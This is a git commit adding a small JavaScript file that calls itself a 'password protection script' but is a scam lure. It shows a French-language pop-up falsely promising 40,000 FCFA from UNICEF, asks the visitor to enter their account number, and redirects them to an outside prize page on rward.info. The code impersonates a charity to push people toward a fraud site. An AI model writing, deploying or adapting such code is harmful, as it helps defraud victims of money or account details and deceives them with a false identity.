659a2d115e47c92691f9417c291e4c578fbf9dcb
ita-giftt <tallaakoti@gmail.com>
2026-02-03 13:13:12 +0100

    Create activation11.js

---
+++ activation11.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L ARGENT'
+password = prompt(
+  'Félicitations ! Vous êtes admissible à recevoir 40 000 FCFA de l’UNICEF. Veuillez appuyer sur OK pour saisir votre numéro de compte..',
+  'RETIRER DE L ARGENT'
+);
+if (password != 'RETIRER DE L ARGENT') {
+  location.href = 'https://rward.info/40000CFA-Khaby-UNICEF.html';
+}
